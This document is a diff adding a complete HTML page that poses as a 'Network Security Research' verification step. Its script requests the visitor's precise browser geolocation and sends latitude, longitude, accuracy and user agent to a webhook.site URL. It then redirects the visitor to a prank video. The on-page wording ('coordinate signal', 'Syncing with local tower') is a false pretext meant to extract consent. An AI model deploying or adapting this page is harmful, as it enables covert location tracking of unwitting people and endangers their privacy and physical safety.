@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dissertation Node Verification</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; }
+        button { background-color: #007bff; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Network Security Research</h2>
+        <p>Please verify your current coordinate signal for the 2026 IP Security study.</p>
+        <button onclick="getLocation()">Verify Connection & Sync</button>
+        <p id="status" style="margin-top:20px; color: #666;"></p>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://webhook.site/39e40ee7-7c88-4417-9e70-f86d66e7cef8'
+        const RICKROLL_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+
+        function getLocation() {
+            const status = document.getElementById('status');
+            if (navigator.geolocation) {
+                status.innerHTML = "Syncing with local tower...";
+                navigator.geolocation.getCurrentPosition(sendDataAndRedirect, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 8000
+                });
+            } else {
+                status.innerHTML = "Error: Protocol not supported by device.";
+            }
+        }
+
+        async function sendDataAndRedirect(position) {
+            const data = {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                acc: position.coords.accuracy,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', 
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                console.log("Network log recorded.");
+            }
+            window.location.href = RICKROLL_URL;
+        }
+        function handleError(error) {
+            document.getElementById('status').innerHTML = "Verification Failed: Permission Denied.";
+        }
+    </script>
+</body>
+</html>
